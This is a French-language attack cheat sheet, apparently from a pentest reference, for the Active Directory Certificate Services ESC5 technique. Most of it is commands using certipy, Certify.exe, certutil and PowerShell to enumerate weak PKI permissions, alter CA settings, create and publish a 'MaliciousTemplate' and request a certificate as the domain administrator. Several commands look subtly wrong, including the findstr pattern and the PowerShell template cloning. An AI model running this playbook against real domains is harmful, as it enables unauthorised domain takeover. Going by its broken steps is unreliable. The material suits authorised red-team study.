### Description

ESC5 exploite des permissions trop permissives sur les objets de l'infrastructure PKI (Certificate Authority, Certificate Templates container, ou autres objets critiques), permettant à un utilisateur de modifier la configuration de l'autorité de certification ou de créer de nouveaux modèles vulnérables.

### Conditions vulnérables

ESC5 se produit quand un utilisateur a des permissions dangereuses sur :

1. **L'objet Certificate Authority** - Droits `WriteProperty`, `WriteOwner`, `WriteDacl`, ou `FullControl` sur la CA
2. **Le container Certificate Templates** - Permissions permettant de créer/modifier des templates
3. **L'objet Configuration PKI** - Contrôle sur la configuration générale de la PKI
4. **Objets NTAuthCertificates** - Permissions sur les certificats de confiance pour l'authentification

---

### Exploitation depuis linux (certipy)

Enumération des objets PKI vulnérables :

```bash
certipy find -u user@domain.local -p password -target dc01.domain.local

# Énumération avec sortie JSON pour analyse détaillée des permissions PKI
certipy find -u user@domain.local -p password -target dc01.domain.local -json -output pki_permissions.json 

# Recherche spécifique des permissions sur les objets PKI
certipy find -u user@domain.local -p password -target dc01.domain.local -vulnerable | grep -A15 "Certificate Authorities\|PKI Objects"
```

Modification des permissions de la CA :

```bash
# Ajout de permissions sur la CA pour permettre l'approbation de demandes
certipy ca -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -enable-user-specified-san

# Modification des paramètres de la CA
certipy ca -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -disable-request-approval
```

Création d'un nouveau template vulnérable :

```bash
# Création d'un template ESC1 personnalisé
certipy template -u user@domain.local -p password -target dc01.domain.local -template 'MaliciousTemplate' -create -enable-enrollee-supplies-subject -client-auth

# Publication du template sur la CA
certipy ca -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -add-template 'MaliciousTemplate'
```

Exploitation du template créé :

```bash
# Demande d'un certificat administrateur avec le nouveau template
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'MaliciousTemplate' -upn administrator@domain.local
```

---

### Exploitation depuis windows (certify.exe + PowerShell)

Enumération des objets PKI vulnérables :

```powershell
# Énumération des modèles et objets PKI vulnérables 
Certify.exe find /vulnerable 

# Recherche spécifique des permissions sur les objets PKI
Certify.exe find /vulnerable | findstr "Certificate Authorities\|PKI Objects"

# Vérification manuelle des permissions sur la CA
Get-ADObject -Filter {objectClass -eq "certificationAuthority"} -Properties * | ForEach-Object {
    Get-Acl -Path "AD:$($_.DistinguishedName)"
}
```

Modification des paramètres de la CA via PowerShell :

```powershell
# Modification des paramètres de la CA (nécessite des permissions appropriées)
certutil -setreg CA\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2

# Redémarrage du service de la CA pour appliquer les changements
Restart-Service CertSvc
```

Création d'un template malveillant :

```powershell
# Création d'un nouveau template via duplication
$sourceTemplate = Get-ADObject -Filter {cn -eq "User"} -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Properties *

# Création du template malveillant
$newTemplate = $sourceTemplate.Clone()
$newTemplate.Name = "MaliciousTemplate"
$newTemplate."msPKI-Certificate-Name-Flag" = 1  # ENROLLEE_SUPPLIES_SUBJECT
New-ADObject -Type pKICertificateTemplate -Name "MaliciousTemplate" -Path "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -OtherAttributes $newTemplate.Attributes

# Publication du template sur la CA
certutil -SetCATemplates +MaliciousTemplate
```

Exploitation du template créé :

```powershell
# Demande de certificat avec le template malveillant
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:MaliciousTemplate /subject:"CN=administrator,CN=Users,DC=domain,DC=local"
```
